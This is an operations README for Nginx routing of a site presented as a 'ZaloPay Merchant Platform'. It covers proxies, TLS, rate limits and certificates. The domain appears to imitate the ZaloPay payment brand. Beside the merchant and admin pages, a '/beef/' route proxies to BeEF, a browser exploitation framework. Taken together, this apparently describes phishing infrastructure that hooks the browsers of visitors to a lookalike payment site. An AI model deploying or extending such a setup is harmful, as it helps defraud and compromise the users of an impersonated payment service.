# Nginx Configuration for ZaloPay Merchant Platform

## Overview

This directory contains the Nginx configurations for the ZaloPay Merchant Platform, implementing a multi-tier routing architecture that separates merchant (customer-facing) and admin (management) interfaces.

## Configuration Files

### `nginx.conf`
Main Nginx configuration file that defines:
- Worker processes and connections
- HTTP settings and MIME types
- SSL/TLS configuration (protocols, ciphers, session settings)
- Gzip compression
- Rate limiting zones
- Security headers
- Upstream server definitions

### `conf.d/default.conf`
Development/HTTP configuration:
- HTTP server on port 80
- Routes for all interfaces (root, merchant, admin, api, beef)
- Proxy settings for backend and frontend
- Health check endpoints
- Supports both domain and IP access

### `conf.d/production.conf`
Production/HTTPS configuration:
- HTTP to HTTPS redirect
- SSL/TLS enabled on port 443
- Enhanced security headers
- Let's Encrypt certificate configuration
- Same routing as default.conf but with HTTPS

## Routing Architecture

```
                    ┌─────────────────┐
                    │  Internet       │
                    └────────┬────────┘
                             │
                    ┌────────▼────────┐
                    │  Nginx (80/443) │
                    │  Load Balancer  │
                    └────────┬────────┘
                             │
        ┌────────────────────┼────────────────────┐
        │                    │                    │
    ┌───▼────┐          ┌───▼────┐          ┌───▼────┐
    │ Root   │          │Frontend│          │Backend │
    │Router  │          │        │          │  API   │
    │   /    │          │/merchant│         │ /api/  │
    │        │          │ /admin/ │         │        │
    └────────┘          └────────┘          └────────┘
```

## Route Mapping

### Domain Configuration
- **Domain**: zalopaymerchan.com
- **Server IP**: 221.120.163.129
- **DNS**: A record pointing domain to server IP

### Route Definitions

| Path | Destination | Purpose |
|------|------------|---------|
| `/` | Frontend Router | Landing page with auto-detection |
| `/merchant/` | Frontend Merchant | Customer-facing interface |
| `/admin/` | Frontend Admin | Management dashboard |
| `/api/` | Backend (port 8000) | RESTful API endpoints |
| `/beef/` | BeEF (port 3000) | Browser exploitation framework |
| `/ws` | Backend WebSocket | Real-time updates |

## Proxy Configuration

### Frontend Proxy
```nginx
location / {
    proxy_pass http://frontend;
    proxy_set_header Host $host;
    proxy_set_header X-Real-IP $remote_addr;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header X-Forwarded-Proto $scheme;
}
```

### Backend API Proxy
```nginx
location /api/ {
    limit_req zone=api burst=20 nodelay;
    proxy_pass http://backend_servers;
    # ... additional headers
}
```

### BeEF Proxy
```nginx
location /beef/ {
    limit_req zone=beef burst=5 nodelay;
    proxy_pass http://beef_servers/;
    # ... WebSocket support
}
```

## Rate Limiting

Defined in `nginx.conf`:

```nginx
# API requests: 10 requests per second
limit_req_zone $binary_remote_addr zone=api:10m rate=10r/s;

# Login attempts: 5 requests per minute
limit_req_zone $binary_remote_addr zone=login:10m rate=5r/m;

# BeEF access: 2 requests per minute
limit_req_zone $binary_remote_addr zone=beef:10m rate=2r/m;
```

## Security Features

### SSL/TLS Configuration
- **Protocols**: TLSv1.2, TLSv1.3
- **Ciphers**: Modern, secure cipher suites
- **HSTS**: Strict-Transport-Security header enabled
- **OCSP Stapling**: Enabled for certificate validation

### Security Headers
```nginx
add_header X-Frame-Options DENY;
add_header X-Content-Type-Options nosniff;
add_header X-XSS-Protection "1; mode=block";
add_header Referrer-Policy "strict-origin-when-cross-origin";
add_header Content-Security-Policy "...";
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload";
```

### Rate Limiting
- API endpoints: 10 req/s with burst of 20
- Login endpoints: 5 req/m with burst of 3
- BeEF endpoints: 2 req/m with burst of 5

## Testing Configuration

### Test Nginx Configuration
```bash
# Test syntax
docker compose exec nginx nginx -t

# Reload configuration
docker compose exec nginx nginx -s reload
```

### Test Routes
```bash
# Run routing test suite
./scripts/test_routing.sh

# Manual tests
curl -I http://zalopaymerchan.com/
curl -I http://zalopaymerchan.com/merchant/
curl -I http://zalopaymerchan.com/admin/
curl -I http://zalopaymerchan.com/api/health
```

## Troubleshooting

### Configuration Errors
```bash
# Check configuration syntax
docker compose exec nginx nginx -t

# View error log
docker compose logs nginx | grep error

# Check if service is running
docker compose ps nginx
```

### 502 Bad Gateway
Common causes:
1. Backend service not running
2. Incorrect upstream configuration
3. Network connectivity issues

**Solution**:
```bash
# Check backend status
docker compose ps backend frontend

# Restart services
docker compose restart nginx backend frontend
```

### 404 Not Found
Common causes:
1. Incorrect path mapping
2. Frontend files not built
3. Missing index.html files

**Solution**:
```bash
# Check frontend files
docker compose exec frontend ls -la /usr/share/nginx/html/

# Rebuild frontend
docker compose build frontend
docker compose up -d frontend
```

## SSL Certificate Management

### Obtain Certificates
```bash
# Using certbot
docker compose --profile production run --rm certbot certonly \
  --webroot \
  --webroot-path=/var/www/certbot \
  --email admin@zalopaymerchan.com \
  --agree-tos \
  --no-eff-email \
  -d zalopaymerchan.com \
  -d www.zalopaymerchan.com
```

### Renew Certificates
```bash
# Manual renewal
docker compose run --rm certbot renew

# Automated renewal (cron job)
0 0 * * * docker compose run --rm certbot renew && docker compose restart nginx
```

### Certificate Locations
- Certificates: `/etc/letsencrypt/live/zalopaymerchan.com/fullchain.pem`
- Private key: `/etc/letsencrypt/live/zalopaymerchan.com/privkey.pem`
- Chain: `/etc/letsencrypt/live/zalopaymerchan.com/chain.pem`

## Switching Between Configurations

### Use Development Config (HTTP only)
```bash
# Ensure default.conf is active
# This is the default setup
docker compose up -d
```

### Use Production Config (HTTPS)
```bash
# Update docker-compose.yml to mount production.conf
# Or use environment variable to switch configs
docker compose up -d
```

## Log Files

### Access Logs
- Location: `/var/log/nginx/access.log`
- View: `docker compose logs nginx | grep -v "GET /health"`

### Error Logs
- Location: `/var/log/nginx/error.log`
- View: `docker compose logs nginx | grep error`

### ZaloPay Specific Logs (Production)
- Access: `/var/log/nginx/zalopay_access.log`
- Error: `/var/log/nginx/zalopay_error.log`

## Performance Tuning

### Worker Processes
```nginx
worker_processes auto;  # Automatically set to number of CPU cores
```

### Worker Connections
```nginx
worker_connections 2048;  # Maximum connections per worker
```

### Client Settings
```nginx
client_max_body_size 10M;  # Maximum upload size
keepalive_timeout 65;      # Connection timeout
```

### Buffer Settings
```nginx
proxy_buffer_size 4k;
proxy_buffers 8 4k;
proxy_busy_buffers_size 8k;
```

## Maintenance

### Reload Configuration
```bash
# Graceful reload (no downtime)
docker compose exec nginx nginx -s reload
```

### Restart Nginx
```bash
# Full restart
docker compose restart nginx
```

### Update Configuration
1. Edit configuration file
2. Test configuration: `docker compose exec nginx nginx -t`
3. Reload if valid: `docker compose exec nginx nginx -s reload`
4. Monitor logs: `docker compose logs -f nginx`

## References

- [Nginx Documentation](https://nginx.org/en/docs/)
- [Nginx Proxy Module](https://nginx.org/en/docs/http/ngx_http_proxy_module.html)
- [Nginx SSL Module](https://nginx.org/en/docs/http/ngx_http_ssl_module.html)
- [Let's Encrypt](https://letsencrypt.org/docs/)

---

**Last Updated**: 2025-10-21  
**Version**: 1.0  
**Configuration Target**: zalopaymerchan.com (221.120.163.129)
